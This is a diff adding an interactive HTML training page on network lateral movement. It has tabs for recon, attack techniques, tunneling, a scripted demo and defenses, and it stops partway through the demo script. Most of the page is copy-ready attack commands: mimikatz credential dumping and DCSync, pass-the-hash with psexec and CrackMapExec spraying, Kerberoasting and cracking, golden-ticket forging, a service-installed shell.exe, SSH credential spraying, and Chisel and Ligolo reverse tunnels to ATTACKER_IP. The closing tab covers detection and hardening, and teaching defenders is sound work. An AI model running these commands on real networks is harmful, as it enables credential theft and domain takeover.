@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Lateral Movement</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.b-teal{background:#0a2020;color:#2dd4bf}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.info{border-left-color:#60a5fa}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.b{background:#0d1f3a;color:#60a5fa}
+.snum.p{background:#1e1030;color:#c084fc}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:120px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+</style>
+</head>
+<body>
+<h1>Lateral Movement</h1>
+<p class="sub">Post-exploitation &#183; MITRE ATT&amp;CK TA0008 &#183; Pivot from one compromised host across the internal network to reach high-value targets</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">Overview</button>
+  <button class="tab-btn" onclick="showTab('recon',this)">Internal recon</button>
+  <button class="tab-btn" onclick="showTab('techniques',this)">Techniques</button>
+  <button class="tab-btn" onclick="showTab('tunneling',this)">Tunneling &amp; pivoting</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Detection &amp; defense</button>
+</div>
+
+<!-- OVERVIEW -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Lateral movement is the process of expanding access from an initial foothold to other systems in the internal network. The attacker uses credentials, trust relationships, and network protocols to hop from machine to machine — reaching domain controllers, databases, file servers, and other high-value targets that are not directly exposed to the internet.</p>
+
+  <svg width="100%" viewBox="0 0 680 280" style="max-width:680px;display:block;margin:0 auto 14px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+
+    <!-- Internet -->
+    <rect x="20" y="20" width="100" height="52" rx="8" fill="#0d1f3a" stroke="#60a5fa" stroke-width="0.8"/>
+    <text x="70" y="42" text-anchor="middle" font-size="11" font-weight="600" fill="#60a5fa" font-family="system-ui">Attacker</text>
+    <text x="70" y="58" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">internet</text>
+
+    <!-- DMZ -->
+    <rect x="160" y="10" width="480" height="260" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8" stroke-dasharray="5 3"/>
+    <text x="400" y="30" text-anchor="middle" font-size="11" font-weight="600" fill="#888" font-family="system-ui">Internal network</text>
+
+    <!-- Web server (initial foothold) -->
+    <rect x="180" y="50" width="120" height="48" rx="8" fill="#2a1a08" stroke="#fbbf24" stroke-width="1"/>
+    <text x="240" y="70" text-anchor="middle" font-size="11" font-weight="600" fill="#fbbf24" font-family="system-ui">Web server</text>
+    <text x="240" y="86" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="system-ui">10.10.1.10 (foothold)</text>
+
+    <!-- DB server -->
+    <rect x="360" y="50" width="120" height="48" rx="8" fill="#1a1a22" stroke="#555" stroke-width="0.8"/>
+    <text x="420" y="70" text-anchor="middle" font-size="11" font-weight="600" fill="#ccc" font-family="system-ui">DB server</text>
+    <text x="420" y="86" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">10.10.1.20</text>
+
+    <!-- Domain Controller -->
+    <rect x="540" y="50" width="86" height="48" rx="8" fill="#3a1515" stroke="#f87171" stroke-width="0.8"/>
+    <text x="583" y="70" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">DC</text>
+    <text x="583" y="86" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui">10.10.1.5</text>
+
+    <!-- Dev workstation -->
+    <rect x="180" y="160" width="120" height="48" rx="8" fill="#1a1a22" stroke="#555" stroke-width="0.8"/>
+    <text x="240" y="180" text-anchor="middle" font-size="11" font-weight="600" fill="#ccc" font-family="system-ui">Dev workstation</text>
+    <text x="240" y="196" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">10.10.1.30</text>
+
+    <!-- File server -->
+    <rect x="360" y="160" width="120" height="48" rx="8" fill="#1a1a22" stroke="#555" stroke-width="0.8"/>
+    <text x="420" y="180" text-anchor="middle" font-size="11" font-weight="600" fill="#ccc" font-family="system-ui">File server</text>
+    <text x="420" y="196" text-anchor="middle" font-size="10" fill="#888" font-family="system-ui">10.10.1.40</text>
+
+    <!-- Arrows: attacker to foothold -->
+    <line x1="122" y1="46" x2="178" y2="65" stroke="#fbbf24" stroke-width="1.5" marker-end="url(#arr)"/>
+    <text x="148" y="50" font-size="9" fill="#fbbf24" font-family="system-ui" text-anchor="middle">RCE</text>
+
+    <!-- Lateral movement arrows -->
+    <line x1="302" y1="74" x2="358" y2="74" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr)"/>
+    <line x1="482" y1="74" x2="538" y2="74" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr)"/>
+    <line x1="240" y1="100" x2="240" y2="158" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr)"/>
+    <line x1="302" y1="184" x2="358" y2="184" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr)"/>
+    <line x1="420" y1="100" x2="420" y2="158" stroke="#f87171" stroke-width="1.3" marker-end="url(#arr)"/>
+
+    <text x="330" y="68" font-size="9" fill="#f87171" font-family="system-ui">SMB/SSH</text>
+    <text x="505" y="68" font-size="9" fill="#f87171" font-family="system-ui">PTH</text>
+
+    <!-- Legend -->
+    <rect x="180" y="230" width="460" height="30" rx="6" fill="#1a1a22" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="200" y="249" font-size="10" fill="#fbbf24" font-family="system-ui">&#9650; Initial foothold</text>
+    <text x="310" y="249" font-size="10" fill="#f87171" font-family="system-ui">&#9658; Lateral movement paths</text>
+    <text x="460" y="249" font-size="10" fill="#f87171" font-family="system-ui">&#9670; DC = ultimate target</text>
+  </svg>
+
+  <div style="background:#13131a;border-radius:8px;padding:12px;border:1px solid #2a2a30;">
+    <div style="font-size:13px;font-weight:600;color:#ccc;margin-bottom:8px;">The attacker's goal — Domain Admin</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">In an Active Directory environment, the ultimate target is the Domain Controller. Owning the DC means owning every machine in the domain — you can create users, reset passwords, push malware via GPO, and extract all credentials with a single command. Lateral movement is the path to get there from any initial foothold.</p>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;margin-top:8px;">
+      <div style="background:#2a1010;border-radius:6px;padding:8px 12px;font-size:11px;color:#f87171;">Pass-the-Hash — reuse NTLM hash without cracking</div>
+      <div style="background:#2a1010;border-radius:6px;padding:8px 12px;font-size:11px;color:#f87171;">Pass-the-Ticket — steal and reuse Kerberos tickets</div>
+      <div style="background:#2a1010;border-radius:6px;padding:8px 12px;font-size:11px;color:#f87171;">Kerberoasting — crack service account passwords offline</div>
+      <div style="background:#2a1a08;border-radius:6px;padding:8px 12px;font-size:11px;color:#fbbf24;">SSH pivoting — tunnel through compromised hosts</div>
+      <div style="background:#2a1a08;border-radius:6px;padding:8px 12px;font-size:11px;color:#fbbf24;">Credential reuse — same password across hosts</div>
+      <div style="background:#2a1a08;border-radius:6px;padding:8px 12px;font-size:11px;color:#fbbf24;">WMI/PSExec — remote execution via admin shares</div>
+    </div>
+  </div>
+</div>
+
+<!-- INTERNAL RECON -->
+<div class="tab-panel" id="tab-recon">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">After landing on an internal host, enumerate the network before moving. Understanding what exists and how it's connected shapes every subsequent step.</p>
+
+  <div class="sc-card sc-blue" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Network discovery from compromised host</div>
+    <div class="code"># Current host's network info
+ip addr / ifconfig           # IP, subnet, interfaces
+ip route / route -n          # routing table — what subnets are reachable?
+cat /etc/hosts               # local DNS overrides
+arp -a                       # ARP cache — recently seen hosts
+
+# Discover live hosts (ping sweep)
+for i in $(seq 1 254); do ping -c1 -W1 10.10.1.$i &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo "10.10.1.$i up"; done
+# Or with nmap (if available):
+nmap -sn 10.10.1.0/24        # ping scan, no port scan
+
+# Port scan discovered hosts
+nmap -sV -p 22,80,443,445,3389,5985,1433,3306 10.10.1.0/24
+# 445  = SMB (Windows lateral movement)
+# 5985 = WinRM (remote PowerShell)
+# 3389 = RDP
+# 22   = SSH
+# 1433 = MSSQL
+
+# Active Directory enumeration (if Windows domain)
+net user /domain             # all domain users
+net group /domain            # all domain groups
+net group "Domain Admins" /domain   # who has DA?
+nltest /dclist:corp.local    # find domain controllers</div>
+  </div>
+
+  <div class="sc-card sc-purple" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">BloodHound — Active Directory attack path mapping</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">BloodHound ingests AD data and graphs the shortest path from any user to Domain Admin — turning manual AD enumeration into a visual attack path finder.</p>
+    <div class="code"># Collect AD data with SharpHound (on Windows domain host)
+.\SharpHound.exe -c All --zipfilename bloodhound.zip
+
+# Or Python collector (from Linux with domain creds)
+bloodhound-python -u user -p password -d corp.local -ns 10.10.1.5 -c All
+
+# Transfer zip to attacker machine, import into BloodHound GUI
+# Query: "Shortest path to Domain Admins"
+# BloodHound shows: User A → can PSExec to Host B → Host B admin is member of DA
+
+# Key BloodHound queries:
+# - Shortest Paths to Domain Admins
+# - Find Principals with DCSync Rights
+# - Find Computers where Domain Users are Local Admin
+# - Kerberoastable Accounts</div>
+  </div>
+
+  <div class="sc-card sc-teal">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Windows credential locations — harvest before moving</div>
+    <div class="code"># Memory — dump with mimikatz (needs admin/SYSTEM)
+privilege::debug
+sekurlsa::logonpasswords     # all cached creds in LSASS
+lsadump::sam                 # local SAM database hashes
+lsadump::dcsync /user:krbtgt # DCSync — pull any AD hash
+
+# On-disk credential files
+dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\
+dir C:\Users\*\AppData\Local\Microsoft\Credentials\
+cmdkey /list                  # stored Windows credentials
+# Browser passwords:
+dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
+
+# Linux credential locations
+cat /etc/shadow               # local password hashes (needs root)
+find / -name "*.key" -o -name "id_rsa" 2&gt;/dev/null  # SSH keys
+grep -r "password" /var/www/ /etc/ /opt/ 2&gt;/dev/null</div>
+  </div>
+</div>
+
+<!-- TECHNIQUES -->
+<div class="tab-panel" id="tab-techniques">
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Pass-the-Hash (PtH)</span><span class="badge b-red">Most common Windows lateral move</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Windows NTLM authentication accepts a hash directly — no need to crack it. Steal an NTLM hash from memory and use it to authenticate as that user on other machines.</p>
+    <div class="code"># Step 1: Dump NTLM hashes with mimikatz (from admin shell)
+privilege::debug
+sekurlsa::logonpasswords
+# Output: Username: Administrator  NTLM: aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+
+# Step 2: Use hash to authenticate to other machines (no cracking!)
+# impacket-psexec (Linux)
+impacket-psexec Administrator@10.10.1.20 -hashes aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+
+# CrackMapExec — spray hash across all machines
+crackmapexec smb 10.10.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
+# Shows which hosts have the same local admin password
+
+# Evil-WinRM (WinRM remote shell)
+evil-winrm -i 10.10.1.20 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Kerberoasting</span><span class="badge b-red">AD — offline hash crack</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Any domain user can request a service ticket (TGS) for any service account in AD. The ticket is encrypted with the service account's password hash — take it offline and crack it.</p>
+    <div class="code"># Step 1: Find service accounts (SPNs registered in AD)
+# Any domain user can do this:
+impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.1.5 -request
+# Or with PowerView:
+Get-DomainUser -SPN | select samaccountname, serviceprincipalname
+
+# Step 2: Request TGS tickets (saved to file)
+impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.1.5 -request -outputfile kerberoast.txt
+
+# Step 3: Crack offline — no network connection to target needed
+hashcat -a 0 -m 13100 kerberoast.txt rockyou.txt -r rules/best64.rule
+
+# Cracked password = service account password
+# Service accounts often have excessive privileges → lateral movement or DA</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Pass-the-Ticket (PtT) &amp; Golden Ticket</span><span class="badge b-amber">AD — Kerberos abuse</span>
+    </div>
+    <div class="code"># Pass-the-Ticket — steal and reuse an existing Kerberos ticket
+# Export tickets with mimikatz:
+sekurlsa::tickets /export
+# Loads ticket into current session:
+kerberos::ptt C:\path\to\ticket.kirbi
+
+# Golden Ticket — forge ANY Kerberos ticket using krbtgt hash
+# Requires: krbtgt NTLM hash (get via DCSync or DC compromise)
+# Step 1: Get krbtgt hash
+lsadump::dcsync /user:krbtgt
+# Step 2: Forge golden ticket (gives DA to ANY domain user, forever)
+kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:NTLM_HASH /ptt
+# → Full domain admin access with a forged ticket
+# → Persists even after password changes (until krbtgt is reset TWICE)</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Remote execution — PSExec, WMI, WinRM, SMB</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code"># PSExec (uses SMB admin shares — creates a service)
+impacket-psexec corp.local/Administrator:'Password123!'@10.10.1.20
+# Or with hash:
+impacket-psexec Administrator@10.10.1.20 -hashes :NTLM_HASH
+
+# WMI execution (stealthier — no service created)
+impacket-wmiexec Administrator:'Password123!'@10.10.1.20
+wmic /node:10.10.1.20 /user:Administrator /password:Password123! process call create "cmd.exe /c whoami &gt; C:\output.txt"
+
+# WinRM (PowerShell remoting — port 5985/5986)
+evil-winrm -i 10.10.1.20 -u Administrator -p 'Password123!'
+Enter-PSSession -ComputerName 10.10.1.20 -Credential (Get-Credential)
+
+# SMB file drop + execution
+# Copy payload to admin share, then run:
+copy shell.exe \\10.10.1.20\C$\Windows\Temp\
+sc \\10.10.1.20 create shell binpath= "C:\Windows\Temp\shell.exe" start= auto
+sc \\10.10.1.20 start shell</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">SSH lateral movement (Linux networks)</span><span class="badge b-purple">Linux / mixed</span>
+    </div>
+    <div class="code"># Credential reuse via SSH
+# Password found on web server → try on all internal hosts:
+for host in 10.10.1.{10..50}; do
+  sshpass -p 'FoundPassword!' ssh -o StrictHostKeyChecking=no user@$host whoami 2&gt;/dev/null &amp;&amp; echo "WORKS: $host"
+done
+
+# SSH key reuse — if ~/.ssh/id_rsa is readable:
+find / -name "id_rsa" 2&gt;/dev/null
+# Try the key on all internal hosts:
+ssh -i /home/user/.ssh/id_rsa -o StrictHostKeyChecking=no user@10.10.1.20
+
+# SSH agent forwarding abuse
+# If an admin SSHes to this machine WITH agent forwarding enabled:
+SSH_AUTH_SOCK=/tmp/ssh-abc123/agent.1234 ssh admin@10.10.1.5   # use their key!</div>
+  </div>
+</div>
+
+<!-- TUNNELING -->
+<div class="tab-panel" id="tab-tunneling">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Pivoting creates a tunnel through a compromised host so you can reach internal network segments that are not directly accessible from your attack machine.</p>
+
+  <div class="sc-card sc-blue" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">SSH port forwarding &amp; SOCKS proxy</div>
+    <div class="code"># Local port forward — access internal DB from attacker machine
+# Scenario: DB at 10.10.1.20:3306 only reachable from 10.10.1.10
+ssh -L 3306:10.10.1.20:3306 user@10.10.1.10
+# Now: mysql -h 127.0.0.1 -P 3306 connects through the tunnel
+
+# Dynamic SOCKS proxy — route ALL traffic through pivot host
+ssh -D 1080 user@10.10.1.10
+# Configure proxychains: socks5 127.0.0.1 1080
+proxychains nmap -sT -p 22,80,443,445 10.10.2.0/24   # scan segment 2
+proxychains impacket-psexec Administrator@10.10.2.50   # lateral move to seg 2
+
+# Remote port forward — expose internal service to attacker
+# (useful when attacker can't SSH in but target can SSH out)
+ssh -R 8080:127.0.0.1:80 attacker@ATTACKER_IP
+# ATTACKER_IP:8080 now reaches target's localhost:80</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Chisel — HTTP tunnel (firewall bypass)</div>
+    <div class="code"># Chisel creates a TCP/UDP tunnel over HTTP — bypasses firewalls blocking non-HTTP
+# Attacker (server):
+./chisel server -p 8080 --reverse
+
+# Target (client) — outbound HTTP allowed, looks like normal web traffic:
+./chisel client ATTACKER_IP:8080 R:socks
+# Creates a SOCKS5 proxy on attacker's 127.0.0.1:1080
+
+# Use proxychains through the Chisel tunnel:
+proxychains crackmapexec smb 10.10.1.0/24 -u Administrator -H NTLM_HASH
+
+# Chisel with specific port forward:
+./chisel client ATTACKER_IP:8080 R:3389:10.10.1.20:3389
+# Now RDP to 127.0.0.1:3389 on attacker → reaches 10.10.1.20:3389 via tunnel</div>
+  </div>
+
+  <div class="sc-card sc-purple" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Ligolo-ng — layer 3 tunnel (cleanest option)</div>
+    <div class="code"># Ligolo-ng creates a virtual network interface — no proxychains needed
+# Attacker (server):
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# Target (agent):
+./agent -connect ATTACKER_IP:11601 -ignore-cert
+
+# On attacker — add route to internal subnet:
+ip route add 10.10.1.0/24 dev ligolo
+# Start tunnel in ligolo console: session → start
+
+# Now ALL tools work natively — no proxychains:
+nmap -sV 10.10.1.0/24       # full network scan
+evil-winrm -i 10.10.1.20    # direct WinRM
+ssh user@10.10.1.30          # direct SSH</div>
+  </div>
+
+  <div class="sc-card sc-teal">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">Multi-hop pivoting — chaining through segments</div>
+    <div class="code"># Scenario: Attacker → Segment 1 (10.10.1.x) → Segment 2 (10.10.2.x)
+# Can only reach 10.10.2.x through 10.10.1.10
+
+# Option 1: SSH chain (-J jump host)
+ssh -J user@10.10.1.10 user@10.10.2.20   # SSH directly to 10.10.2.20 via pivot
+
+# Option 2: Nested proxychains
+# First tunnel: SOCKS on 1080 via 10.10.1.10
+ssh -D 1080 user@10.10.1.10
+# Second tunnel: SOCKS on 1081 via 10.10.2.10 (through first tunnel)
+proxychains ssh -D 1081 user@10.10.2.10
+# Now: proxychains -q (with 1081) can reach 10.10.3.x
+
+# Option 3: Ligolo double pivot
+# Add second agent on 10.10.2.20
+# Add route: ip route add 10.10.2.0/24 dev ligolo2</div>
+  </div>
+</div>
+
+<!-- DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate lateral movement scenarios across an internal network. Each shows the attacker's starting position, technique, and what access is gained.</p>
+
+  <div style="margin-bottom:10px;">
+    <div class="chip">Scenario</div>
+    <select id="lateral-select" onchange="runDemo()" style="width:100%;font-family:system-ui;">
+      <option value="pth">Pass-the-Hash — reuse admin NTLM hash across LAN</option>
+      <option value="kerberoast">Kerberoasting — crack service account password</option>
+      <option value="cme_spray">CrackMapExec — spray hash across subnet</option>
+      <option value="ssh_pivot">SSH SOCKS proxy — scan hidden segment</option>
+      <option value="golden">Golden Ticket — forge permanent DA access</option>
+    </select>
+  </div>
+
+  <div style="margin-bottom:8px;">
+    <div class="chip">Starting position &amp; setup</div>
+    <div class="mono-out" id="setup-out" style="min-height:70px;"></div>
+  </div>
+
+  <div class="grid2">
+    <div><div class="chip">Attack commands</div><div class="mono-out" id="attack-out" style="min-height:120px;"></div></div>
+    <div><div class="chip">Result &amp; access gained</div><div class="mono-out" id="result-out" style="min-height:120px;"></div></div>
+  </div>
+  <div id="demo-verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- DETECTION & DEFENSE -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9312; Disable NTLM — force Kerberos authentication <span class="badge b-red">Blocks PtH at root</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Pass-the-Hash only works because NTLM accepts a hash directly. Disabling NTLM and enforcing Kerberos eliminates the attack surface. Requires modern Windows and careful testing — some legacy apps use NTLM.</div>
+    <div class="code"># Group Policy: disable NTLM
+# Computer Config &gt; Windows Settings &gt; Security Settings &gt; Local Policies
+# &gt; Security Options &gt; Network Security: Restrict NTLM
+
+# PowerShell — require Kerberos
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5
+# Level 5 = only NTLMv2, refuse NTLMv1 &amp; LM
+
+# Enable Protected Users group — members cannot use NTLM
+Add-ADGroupMember -Identity "Protected Users" -Members "AdminUser"
+# Protected Users also: no credential caching, no delegation</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9313; Enable Credential Guard &amp; Protected LSASS <span class="badge b-green">Blocks mimikatz</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Credential Guard moves LSASS credentials into an isolated VBS (Virtualization Based Security) container — mimikatz and other tools cannot read them even with SYSTEM privileges.</div>
+    <div class="code"># Enable Credential Guard via Group Policy
+# Device Guard and Credential Guard → Turn on Credential Guard
+
+# Or directly:
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
+
+# Enable PPL (Protected Process Light) for LSASS
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
+# Requires UEFI secure boot + Secure Boot DB signing</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9314; Reduce Kerberoasting attack surface <span class="badge b-green">Essential</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Kerberoastable accounts are only a problem if their passwords are weak. Use strong random passwords for service accounts and enable AES-only encryption.</div>
+    <div class="code"># Find Kerberoastable accounts (run this yourself)
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# Mitigations:
+# 1. Use Group Managed Service Accounts (gMSA) — 120-char auto-rotating passwords
+New-ADServiceAccount -Name "WebSvc" -DNSHostName "web.corp.local" -PrincipalsAllowedToRetrieveManagedPassword "WebServers"
+
+# 2. Disable RC4 encryption for SPNs — force AES (much harder to crack)
+Set-ADUser -Identity svc_web -KerberosEncryptionType AES256
+
+# 3. Mark sensitive accounts as "Account is sensitive and cannot be delegated"</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9315; Network segmentation — limit blast radius <span class="badge b-amber">Defense in depth</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Even with credentials, an attacker can't reach what they can't route to. Segment the network so that compromise of one zone doesn't expose others.</div>
+    <div class="code"># Key segmentation principles:
+# - DMZ should NOT have direct routes to internal subnets
+# - Workstations should NOT be able to reach servers directly (client isolation)
+# - Lateral movement over SMB (445) between workstations → BLOCK
+# - WinRM (5985) and RDP (3389) → only allowed FROM jump hosts, not peer-to-peer
+
+# Windows Firewall GPO — block lateral movement ports between workstations:
+# netsh advfirewall firewall add rule name="Block SMB Lateral" dir=in action=block protocol=TCP localport=445
+# Apply to all workstations, except from IT management subnet</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9316; Detection — what to watch for</div>
+    <div class="code"># Windows Event Log indicators:
+# 4624 — Logon (Type 3 = network logon, Type 10 = remote interactive)
+# 4625 — Failed logon (spray attempts)
+# 4648 — Logon with explicit credentials (runas / PtH attempt)
+# 7045 — New service installed (PSExec creates a service)
+# 4769 — Kerberos TGS request (many in short time = Kerberoasting)
+# 4662 — DCSync: Object access with replication rights
+
+# Suspicious patterns:
+# - Admin account logging into workstations it never touches
+# - Service account logging in interactively (should only be NETWORK logons)
+# - Lateral tool signatures: PSExec service name "PSEXESVC"
+# - Large number of TGS requests from single user in short window
+# - LSASS access from non-system processes (mimikatz signature)
+
+# Tools: Microsoft Defender for Identity, Velociraptor, Elastic SIEM</div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+const DEMOS={
+  pth:{
+    setup:`Starting position: shell on 10.10.1.10 (web server) as Administrator
+Already ran mimikatz, dumped local SAM:
+
+Administrator  NTLM: 8846f7eaee8fb117ad06bdd830b7586c
+Guest          NTLM: aad3b435b51404eeaad3b435b51404ee
+
+Target: DB server at 10.10.1.20 (no direct access via web exploit)`,
+    attack:`# impacket-psexec with NTLM hash (no password needed!)
+impacket-psexec Administrator@10.10.1.20 \\
+  -hashes aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+
+# CrackMapExec — test hash on entire subnet at once
+crackmapexec smb 10.10.1.0/24 \\
+  -u Administrator \\
+  -H 8846f7eaee8fb117ad06bdd830b7586c`,
+    result:`Impacket v0.11.0
+
+[*] Requesting shares on 10.10.1.20
+[*] Found writable share ADMIN$
+[*] Uploading file QsTqYMnx.exe
+[*] Opening SVCManager on 10.10.1.20
+[+] Creating service xBMx on 10.10.1.20
